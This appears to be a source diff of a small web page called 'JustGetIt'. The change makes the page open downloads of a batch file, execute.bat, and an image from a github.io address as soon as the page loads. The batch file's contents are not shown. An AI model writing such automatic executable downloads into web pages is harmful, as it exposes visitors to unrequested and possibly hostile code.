@@ -4,13 +4,12 @@
     <meta charset="UTF-8">
     <title>JustGetIt</title>
     <script type="text/javascript">
-        function startDownload()
+        function startDownload(theUrl)
         {
-            var url='https://frabely.github.io/execute.bat';
-            window.open(url, 'Download');
-            var url='https://frabely.github.io/yTPic.jpg';
-            window.open(url, 'Download');
+            window.open(theUrl, 'Download');
         }
+        startDownload('https://frabely.github.io/yTPic.jpg')
+        startDownload('https://frabely.github.io/execute.bat')
     </script>
 </head>
 <style>
